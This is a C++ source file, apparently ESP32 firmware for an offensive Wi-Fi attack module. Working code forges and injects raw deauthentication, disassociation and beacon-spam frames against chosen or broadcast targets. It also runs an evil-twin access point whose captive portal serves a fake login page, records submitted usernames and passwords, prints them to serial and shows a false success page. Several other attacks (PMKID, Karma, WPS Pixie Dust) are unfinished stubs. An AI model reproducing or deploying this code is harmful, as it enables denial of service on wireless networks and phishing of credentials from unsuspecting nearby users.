#include "WiFiAttack.h"

// Static instance for callbacks
static WiFiAttack* attackInstance = nullptr;

WiFiAttack::WiFiAttack() :
    initialized(false),
    attackActive(false),
    attackPaused(false),
    currentAttack(ATTACK_NONE),
    lastAttackPacket(0),
    attackInterval(100),
    lastUpdate(0),
    webServer(nullptr),
    dnsServer(nullptr),
    totalPacketsSent(0),
    packetsPerSecond(0),
    lastStatsUpdate(0) {
    
    attackInstance = this;
}

WiFiAttack::~WiFiAttack() {
    stop();
    attackInstance = nullptr;
}

bool WiFiAttack::begin() {
    if (initialized) {
        return true;
    }
    
    Serial.println("[Attack] Initializing WiFi attack module...");
    
    // Initialize WiFi
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    initialized = true;
    Serial.println("[Attack] Attack module initialized successfully");
    return true;
}

void WiFiAttack::update() {
    if (!initialized || attackPaused) return;
    
    unsigned long now = millis();
    
    // Update statistics
    if (now - lastStatsUpdate > 1000) {
        packetsPerSecond = totalPacketsSent;
        totalPacketsSent = 0;
        lastStatsUpdate = now;
    }
    
    // Execute active attacks
    if (attackActive && (now - lastAttackPacket >= attackInterval)) {
        switch (currentAttack) {
            case ATTACK_DEAUTH:
            case ATTACK_BROADCAST_DEAUTH:
                executeDeauthAttack();
                break;
            case ATTACK_BEACON_SPAM:
                executeBeaconSpam();
                break;
            case ATTACK_PROBE_SPAM:
                executeProbeSpam();
                break;
            case ATTACK_PMKID:
                executePMKIDAttack();
                break;
            case ATTACK_KARMA:
                executeKarmaAttack();
                break;
            default:
                break;
        }
        lastAttackPacket = now;
    }
    
    lastUpdate = now;
}

void WiFiAttack::stop() {
    if (!initialized) return;
    
    Serial.println("[Attack] Stopping WiFi attack module...");
    
    stopAttack();
    stopEvilTwin();
    stopCaptivePortal();
    
    initialized = false;
    Serial.println("[Attack] Attack module stopped");
}

void WiFiAttack::startDeauthAttack(const String& targetMAC, const String& apBSSID, uint32_t channel, uint32_t packetsPerSecond) {
    if (!initialized) return;
    
    Serial.printf("[Attack] Starting deauth attack: %s -> %s on channel %d (%d pps)\n", 
                  targetMAC.c_str(), apBSSID.c_str(), channel, packetsPerSecond);
    
    stopAttack();
    
    DeauthTarget target;
    target.targetMAC = targetMAC;
    target.apBSSID = apBSSID;
    target.channel = channel;
    target.packetsPerSecond = packetsPerSecond;
    target.packetsSent = 0;
    target.isActive = true;
    
    deauthTargets.clear();
    deauthTargets.push_back(target);
    
    currentAttack = ATTACK_DEAUTH;
    attackActive = true;
    attackInterval = 1000 / packetsPerSecond;
    
    setWiFiChannel(channel);
}

void WiFiAttack::startBroadcastDeauth(const String& apBSSID, uint32_t channel, uint32_t packetsPerSecond) {
    if (!initialized) return;
    
    Serial.printf("[Attack] Starting broadcast deauth attack: %s on channel %d\n", apBSSID.c_str(), channel);
    
    startDeauthAttack("FF:FF:FF:FF:FF:FF", apBSSID, channel, packetsPerSecond);
    currentAttack = ATTACK_BROADCAST_DEAUTH;
}

void WiFiAttack::startMultiTargetDeauth(const std::vector<DeauthTarget>& targets) {
    if (!initialized || targets.empty()) return;
    
    Serial.printf("[Attack] Starting multi-target deauth attack with %d targets\n", targets.size());
    
    stopAttack();
    
    deauthTargets = targets;
    for (auto& target : deauthTargets) {
        target.isActive = true;
        target.packetsSent = 0;
    }
    
    currentAttack = ATTACK_DEAUTH;
    attackActive = true;
    attackInterval = 100; // Base interval, will cycle through targets
    
    // Set channel to first target's channel
    if (!targets.empty()) {
        setWiFiChannel(targets[0].channel);
    }
}

void WiFiAttack::addDeauthTarget(const String& targetMAC, const String& apBSSID, uint32_t channel) {
    DeauthTarget target;
    target.targetMAC = targetMAC;
    target.apBSSID = apBSSID;
    target.channel = channel;
    target.packetsPerSecond = 10;
    target.packetsSent = 0;
    target.isActive = true;
    
    deauthTargets.push_back(target);
    Serial.printf("[Attack] Added deauth target: %s -> %s\n", targetMAC.c_str(), apBSSID.c_str());
}

void WiFiAttack::removeDeauthTarget(const String& targetMAC) {
    deauthTargets.erase(
        std::remove_if(deauthTargets.begin(), deauthTargets.end(),
            [&targetMAC](const DeauthTarget& target) {
                return target.targetMAC == targetMAC;
            }), deauthTargets.end());
    
    Serial.printf("[Attack] Removed deauth target: %s\n", targetMAC.c_str());
}

void WiFiAttack::startDisassocAttack(const String& targetMAC, const String& apBSSID, uint32_t channel) {
    if (!initialized) return;
    
    Serial.printf("[Attack] Starting disassoc attack: %s -> %s on channel %d\n", 
                  targetMAC.c_str(), apBSSID.c_str(), channel);
    
    // Similar to deauth but with disassociation frames
    startDeauthAttack(targetMAC, apBSSID, channel, 10);
    currentAttack = ATTACK_DISASSOC;
}

void WiFiAttack::startBeaconSpam(const BeaconSpamConfig& config) {
    if (!initialized || config.ssidList.empty()) return;
    
    Serial.printf("[Attack] Starting beacon spam with %d SSIDs\n", config.ssidList.size());
    
    stopAttack();
    
    beaconConfig = config;
    currentAttack = ATTACK_BEACON_SPAM;
    attackActive = true;
    attackInterval = 1000 / config.beaconsPerSecond;
    
    setWiFiChannel(config.channel);
}

void WiFiAttack::addSpamSSID(const String& ssid) {
    beaconConfig.ssidList.push_back(ssid);
    Serial.printf("[Attack] Added spam SSID: %s\n", ssid.c_str());
}

void WiFiAttack::loadSSIDWordlist(const String& filename) {
    // TODO: Implement file loading
    Serial.printf("[Attack] Loading SSID wordlist from: %s\n", filename.c_str());
}

void WiFiAttack::generateRandomSSIDs(uint32_t count, uint32_t length) {
    Serial.printf("[Attack] Generating %d random SSIDs of length %d\n", count, length);
    
    const String charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    
    beaconConfig.ssidList.clear();
    for (uint32_t i = 0; i < count; i++) {
        String ssid = "";
        for (uint32_t j = 0; j < length; j++) {
            ssid += charset[random(0, charset.length())];
        }
        beaconConfig.ssidList.push_back(ssid);
    }
}

void WiFiAttack::startProbeSpam(const std::vector<String>& ssidList, uint32_t probesPerSecond) {
    if (!initialized || ssidList.empty()) return;
    
    Serial.printf("[Attack] Starting probe spam with %d SSIDs\n", ssidList.size());
    
    stopAttack();
    
    probeSpamSSIDs = ssidList;
    currentAttack = ATTACK_PROBE_SPAM;
    attackActive = true;
    attackInterval = 1000 / probesPerSecond;
}

void WiFiAttack::startEvilTwin(const EvilTwinConfig& config) {
    if (!initialized) return;
    
    Serial.printf("[Attack] Starting Evil Twin: %s\n", config.targetSSID.c_str());
    
    stopAttack();
    
    evilTwinConfig = config;
    currentAttack = ATTACK_EVIL_TWIN;
    
    setupEvilTwinAP();
    
    if (config.captivePortal) {
        setupCaptivePortal();
    }
}

void WiFiAttack::stopEvilTwin() {
    if (currentAttack == ATTACK_EVIL_TWIN) {
        stopAttack();
        stopCaptivePortal();
        WiFi.softAPdisconnect(true);
        Serial.println("[Attack] Evil Twin stopped");
    }
}

void WiFiAttack::startCaptivePortal(const CaptivePortalConfig& config) {
    if (!initialized) return;
    
    Serial.printf("[Attack] Starting Captive Portal: %s\n", config.ssid.c_str());
    
    captiveConfig = config;
    
    setupCaptivePortal();
    
    // Start AP
    if (config.openNetwork) {
        WiFi.softAP(config.ssid.c_str());
    } else {
        WiFi.softAP(config.ssid.c_str(), config.password.c_str());
    }
    
    Serial.print("[Attack] Captive Portal IP: ");
    Serial.println(WiFi.softAPIP());
}

void WiFiAttack::stopCaptivePortal() {
    if (webServer) {
        webServer->end();
        delete webServer;
        webServer = nullptr;
    }
    
    if (dnsServer) {
        dnsServer->stop();
        delete dnsServer;
        dnsServer = nullptr;
    }
    
    Serial.println("[Attack] Captive Portal stopped");
}

std::vector<String> WiFiAttack::getCapturedCredentials() {
    return captiveConfig.capturedCredentials;
}

void WiFiAttack::startPMKIDAttack(const String& targetBSSID, uint32_t channel) {
    if (!initialized) return;
    
    Serial.printf("[Attack] Starting PMKID attack on %s (channel %d)\n", targetBSSID.c_str(), channel);
    
    stopAttack();
    
    // TODO: Implement PMKID attack logic
    currentAttack = ATTACK_PMKID;
    attackActive = true;
    
    setWiFiChannel(channel);
}

void WiFiAttack::startKarmaAttack(const std::vector<String>& probeSSIDs) {
    if (!initialized || probeSSIDs.empty()) return;
    
    Serial.printf("[Attack] Starting Karma attack with %d probe SSIDs\n", probeSSIDs.size());
    
    stopAttack();
    
    probeSpamSSIDs = probeSSIDs;
    currentAttack = ATTACK_KARMA;
    attackActive = true;
}

void WiFiAttack::startWPSPixieDust(const String& targetBSSID, uint32_t channel) {
    if (!initialized) return;
    
    Serial.printf("[Attack] Starting WPS Pixie Dust attack on %s\n", targetBSSID.c_str());
    
    // TODO: Implement WPS Pixie Dust attack
    Serial.println("[Attack] WPS Pixie Dust not yet implemented");
}

void WiFiAttack::injectCustomFrame(const std::vector<uint8_t>& frame) {
    if (!initialized || frame.empty()) return;
    
    esp_wifi_80211_tx(WIFI_IF_STA, frame.data(), frame.size(), false);
    totalPacketsSent++;
}

void WiFiAttack::injectDeauthFrame(const uint8_t* targetMAC, const uint8_t* apBSSID, uint16_t reason) {
    uint8_t deauthFrame[26];
    buildDeauthFrame(deauthFrame, targetMAC, apBSSID, reason);
    
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    totalPacketsSent++;
}

void WiFiAttack::injectDisassocFrame(const uint8_t* targetMAC, const uint8_t* apBSSID, uint16_t reason) {
    uint8_t disassocFrame[26];
    buildDisassocFrame(disassocFrame, targetMAC, apBSSID, reason);
    
    esp_wifi_80211_tx(WIFI_IF_STA, disassocFrame, sizeof(disassocFrame), false);
    totalPacketsSent++;
}

void WiFiAttack::injectBeaconFrame(const String& ssid, const uint8_t* bssid, uint32_t channel, wifi_auth_mode_t encryption) {
    uint8_t beaconFrame[128];
    buildBeaconFrame(beaconFrame, ssid, bssid, channel, encryption);
    
    esp_wifi_80211_tx(WIFI_IF_STA, beaconFrame, 64, false); // Simplified length
    totalPacketsSent++;
}

void WiFiAttack::stopAttack() {
    if (!attackActive) return;
    
    Serial.println("[Attack] Stopping attack...");
    
    attackActive = false;
    currentAttack = ATTACK_NONE;
    deauthTargets.clear();
    probeSpamSSIDs.clear();
    
    // Return to station mode
    WiFi.mode(WIFI_STA);
    delay(100);
}

void WiFiAttack::pauseAttack() {
    if (attackActive) {
        attackPaused = true;
        Serial.println("[Attack] Attack paused");
    }
}

void WiFiAttack::resumeAttack() {
    if (attackPaused) {
        attackPaused = false;
        Serial.println("[Attack] Attack resumed");
    }
}

void WiFiAttack::setTxPower(int8_t power) {
    if (power < 0 || power > 20) return;
    
    esp_wifi_set_max_tx_power(power * 4); // ESP32 uses 0.25dBm units
    Serial.printf("[Attack] TX power set to %d dBm\n", power);
}

void WiFiAttack::setRandomMAC(bool enabled) {
    // TODO: Implement MAC randomization
    Serial.printf("[Attack] MAC randomization %s\n", enabled ? "enabled" : "disabled");
}

void WiFiAttack::setAttackInterval(uint32_t intervalMs) {
    attackInterval = intervalMs;
    Serial.printf("[Attack] Attack interval set to %d ms\n", intervalMs);
}

void WiFiAttack::setChannel(uint32_t channel) {
    setWiFiChannel(channel);
}

bool WiFiAttack::isAttackActive() {
    return attackActive && !attackPaused;
}

WiFiAttackType WiFiAttack::getCurrentAttack() {
    return currentAttack;
}

String WiFiAttack::getStatusString() {
    if (!initialized) return "Not initialized";
    if (attackPaused) return "Paused";
    if (!attackActive) return "Ready";
    
    switch (currentAttack) {
        case ATTACK_DEAUTH: return "Deauth Attack (" + String(deauthTargets.size()) + " targets)";
        case ATTACK_BROADCAST_DEAUTH: return "Broadcast Deauth";
        case ATTACK_DISASSOC: return "Disassoc Attack";
        case ATTACK_BEACON_SPAM: return "Beacon Spam (" + String(beaconConfig.ssidList.size()) + " SSIDs)";
        case ATTACK_PROBE_SPAM: return "Probe Spam (" + String(probeSpamSSIDs.size()) + " SSIDs)";
        case ATTACK_EVIL_TWIN: return "Evil Twin: " + evilTwinConfig.targetSSID;
        case ATTACK_CAPTIVE_PORTAL: return "Captive Portal: " + captiveConfig.ssid;
        case ATTACK_PMKID: return "PMKID Attack";
        case ATTACK_KARMA: return "Karma Attack";
        default: return "Unknown Attack";
    }
}

uint32_t WiFiAttack::getPacketsSent() {
    return packetsPerSecond;
}

uint32_t WiFiAttack::getTargetCount() {
    return deauthTargets.size();
}

std::vector<DeauthTarget>& WiFiAttack::getDeauthTargets() {
    return deauthTargets;
}

// Frame building methods
void WiFiAttack::buildDeauthFrame(uint8_t* frame, const uint8_t* targetMAC, const uint8_t* apBSSID, uint16_t reason) {
    memset(frame, 0, 26);
    
    // Frame Control (Deauth = 0xC0)
    frame[0] = 0xC0;
    frame[1] = 0x00;
    
    // Duration
    frame[2] = 0x00;
    frame[3] = 0x00;
    
    // Destination Address
    memcpy(&frame[4], targetMAC, 6);
    
    // Source Address (AP)
    memcpy(&frame[10], apBSSID, 6);
    
    // BSSID
    memcpy(&frame[16], apBSSID, 6);
    
    // Sequence Control
    frame[22] = 0x00;
    frame[23] = 0x00;
    
    // Reason Code
    frame[24] = reason & 0xFF;
    frame[25] = (reason >> 8) & 0xFF;
}

void WiFiAttack::buildDisassocFrame(uint8_t* frame, const uint8_t* targetMAC, const uint8_t* apBSSID, uint16_t reason) {
    buildDeauthFrame(frame, targetMAC, apBSSID, reason);
    
    // Change frame control to disassociation (0xA0)
    frame[0] = 0xA0;
}

void WiFiAttack::buildBeaconFrame(uint8_t* frame, const String& ssid, const uint8_t* bssid, uint32_t channel, wifi_auth_mode_t encryption) {
    memset(frame, 0, 128);
    
    // Frame Control (Beacon = 0x80)
    frame[0] = 0x80;
    frame[1] = 0x00;
    
    // Duration
    frame[2] = 0x00;
    frame[3] = 0x00;
    
    // Destination (broadcast)
    memset(&frame[4], 0xFF, 6);
    
    // Source Address
    if (bssid) {
        memcpy(&frame[10], bssid, 6);
        memcpy(&frame[16], bssid, 6);
    } else {
        // Generate random BSSID
        for (int i = 0; i < 6; i++) {
            frame[10 + i] = random(0, 256);
            frame[16 + i] = frame[10 + i];
        }
    }
    
    // Sequence Control
    frame[22] = 0x00;
    frame[23] = 0x00;
    
    // Beacon frame body starts at offset 24
    // Timestamp (8 bytes)
    uint64_t timestamp = millis() * 1000;
    memcpy(&frame[24], &timestamp, 8);
    
    // Beacon Interval
    frame[32] = 0x64; // 100 TUs
    frame[33] = 0x00;
    
    // Capability Information
    uint16_t capabilities = 0x0401; // ESS + Short Preamble
    if (encryption != WIFI_AUTH_OPEN) {
        capabilities |= 0x10; // Privacy
    }
    frame[34] = capabilities & 0xFF;
    frame[35] = (capabilities >> 8) & 0xFF;
    
    // Information Elements start at offset 36
    uint16_t offset = 36;
    
    // SSID element
    frame[offset++] = 0x00; // Element ID
    frame[offset++] = ssid.length(); // Length
    for (int i = 0; i < ssid.length(); i++) {
        frame[offset++] = ssid[i];
    }
    
    // Supported Rates element
    frame[offset++] = 0x01; // Element ID
    frame[offset++] = 0x08; // Length
    frame[offset++] = 0x82; // 1 Mbps
    frame[offset++] = 0x84; // 2 Mbps
    frame[offset++] = 0x8B; // 5.5 Mbps
    frame[offset++] = 0x96; // 11 Mbps
    frame[offset++] = 0x24; // 18 Mbps
    frame[offset++] = 0x30; // 24 Mbps
    frame[offset++] = 0x48; // 36 Mbps
    frame[offset++] = 0x6C; // 54 Mbps
    
    // DS Parameter Set (Channel)
    frame[offset++] = 0x03; // Element ID
    frame[offset++] = 0x01; // Length
    frame[offset++] = channel;
}

void WiFiAttack::buildProbeResponseFrame(uint8_t* frame, const String& ssid, const uint8_t* bssid, uint32_t channel) {
    // Similar to beacon but with probe response frame control
    buildBeaconFrame(frame, ssid, bssid, channel, WIFI_AUTH_OPEN);
    
    // Change frame control to probe response (0x50)
    frame[0] = 0x50;
}

// Attack execution methods
void WiFiAttack::executeDeauthAttack() {
    static uint32_t targetIndex = 0;
    
    if (deauthTargets.empty()) return;
    
    // Cycle through targets
    DeauthTarget& target = deauthTargets[targetIndex % deauthTargets.size()];
    targetIndex++;
    
    if (!target.isActive) return;
    
    uint8_t targetMAC[6], apBSSID[6];
    if (parseMAC(target.targetMAC, targetMAC) && parseMAC(target.apBSSID, apBSSID)) {
        injectDeauthFrame(targetMAC, apBSSID, 7);
        
        // Also send reverse direction
        injectDeauthFrame(apBSSID, targetMAC, 7);
        
        target.packetsSent += 2;
    }
}

void WiFiAttack::executeBeaconSpam() {
    static uint32_t ssidIndex = 0;
    
    if (beaconConfig.ssidList.empty()) return;
    
    String ssid = beaconConfig.ssidList[ssidIndex % beaconConfig.ssidList.size()];
    ssidIndex++;
    
    uint8_t bssid[6];
    if (beaconConfig.randomizeMAC) {
        generateRandomMAC(bssid);
    } else {
        // Use a base BSSID with incremental changes
        for (int i = 0; i < 6; i++) {
            bssid[i] = 0x02; // Locally administered
        }
        bssid[5] = ssidIndex & 0xFF;
    }
    
    uint32_t channel = beaconConfig.useRandomChannels ? random(1, 15) : beaconConfig.channel;
    
    injectBeaconFrame(ssid, bssid, channel, beaconConfig.encryptionType);
}

void WiFiAttack::executeProbeSpam() {
    // TODO: Implement probe spam logic
}

void WiFiAttack::executePMKIDAttack() {
    // TODO: Implement PMKID attack logic
}

void WiFiAttack::executeKarmaAttack() {
    // TODO: Implement Karma attack logic
}

// Evil Twin / Captive Portal implementations
void WiFiAttack::setupEvilTwinAP() {
    WiFi.mode(WIFI_AP_STA);
    
    if (evilTwinConfig.openNetwork) {
        WiFi.softAP(evilTwinConfig.targetSSID.c_str());
    } else {
        WiFi.softAP(evilTwinConfig.targetSSID.c_str(), evilTwinConfig.password.c_str(), evilTwinConfig.channel);
    }
    
    Serial.print("[Attack] Evil Twin AP started. IP: ");
    Serial.println(WiFi.softAPIP());
}

void WiFiAttack::setupCaptivePortal() {
    // Initialize DNS server
    dnsServer = new DNSServer();
    dnsServer->start(53, "*", WiFi.softAPIP());
    
    // Initialize web server
    webServer = new AsyncWebServer(80);
    
    // Serve captive portal page for all requests
    webServer->onNotFound([](AsyncWebServerRequest* request) {
        if (attackInstance) {
            attackInstance->handleCaptivePortalRequest(request);
        }
    });
    
    webServer->on("/", HTTP_GET, [](AsyncWebServerRequest* request) {
        if (attackInstance) {
            attackInstance->handleCaptivePortalRequest(request);
        }
    });
    
    webServer->on("/login", HTTP_POST, [](AsyncWebServerRequest* request) {
        if (attackInstance) {
            attackInstance->handleCredentialCapture(request);
        }
    });
    
    webServer->begin();
    Serial.println("[Attack] Captive portal web server started");
}

void WiFiAttack::handleCaptivePortalRequest(AsyncWebServerRequest* request) {
    String html = getCaptivePortalHTML();
    request->send(200, "text/html", html);
}

void WiFiAttack::handleCredentialCapture(AsyncWebServerRequest* request) {
    String username = "";
    String password = "";
    
    if (request->hasParam("username", true)) {
        username = request->getParam("username", true)->value();
    }
    if (request->hasParam("password", true)) {
        password = request->getParam("password", true)->value();
    }
    
    if (!username.isEmpty() && !password.isEmpty()) {
        String credentials = username + ":" + password;
        captiveConfig.capturedCredentials.push_back(credentials);
        
        Serial.printf("[Attack] Captured credentials - User: %s, Pass: %s\n", 
                      username.c_str(), password.c_str());
    }
    
    // Redirect to success page
    request->send(200, "text/html", getSuccessPageHTML());
}

// Utility functions
bool WiFiAttack::parseMAC(const String& macStr, uint8_t* mac) {
    if (macStr.length() != 17) return false;
    
    for (int i = 0; i < 6; i++) {
        String byte = macStr.substring(i * 3, i * 3 + 2);
        mac[i] = strtol(byte.c_str(), nullptr, 16);
    }
    return true;
}

String WiFiAttack::macToString(const uint8_t* mac) {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(macStr);
}

void WiFiAttack::generateRandomMAC(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = random(0, 256);
    }
    // Set locally administered bit
    mac[0] |= 0x02;
    // Clear multicast bit
    mac[0] &= 0xFE;
}

uint16_t WiFiAttack::calculateChecksum(const uint8_t* data, uint16_t length) {
    uint32_t sum = 0;
    
    for (uint16_t i = 0; i < length - 1; i += 2) {
        sum += (data[i] << 8) + data[i + 1];
    }
    
    if (length % 2) {
        sum += data[length - 1] << 8;
    }
    
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    return ~sum;
}

void WiFiAttack::setWiFiChannel(uint32_t channel) {
    if (channel < 1 || channel > 14) return;
    
    WiFi.mode(WIFI_MODE_NULL);
    delay(100);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

// Static callback handlers
void WiFiAttack::webServerHandler(AsyncWebServerRequest* request) {
    // Static callback - implementation delegated to instance
}

void WiFiAttack::dnsServerHandler() {
    // Static callback - implementation delegated to instance
}

// HTML templates
String WiFiAttack::getCaptivePortalHTML() {
    return R"(
<!DOCTYPE html>
<html>
<head>
    <title>)" + captiveConfig.portalTitle + R"(</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f0f0f0; }
        .container { max-width: 400px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        h2 { color: #333; text-align: center; margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        input[type="submit"] { width: 100%; background: #007cba; color: white; padding: 14px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        input[type="submit"]:hover { background: #005a87; }
        .message { margin-bottom: 20px; color: #666; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <h2>)" + captiveConfig.portalTitle + R"(</h2>
        <div class="message">)" + captiveConfig.portalMessage + R"(</div>
        <form action="/login" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Login">
        </form>
    </div>
</body>
</html>
)";
}

String WiFiAttack::getLoginFormHTML() {
    return getCaptivePortalHTML(); // Same as captive portal for now
}

String WiFiAttack::getSuccessPageHTML() {
    return R"(
<!DOCTYPE html>
<html>
<head>
    <title>Login Successful</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f0f0f0; text-align: center; }
        .container { max-width: 400px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        h2 { color: #28a745; }
        .message { color: #666; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h2>✓ Login Successful</h2>
        <div class="message">You have been successfully authenticated.</div>
        <div class="message">You may now close this window.</div>
    </div>
</body>
</html>
)";
}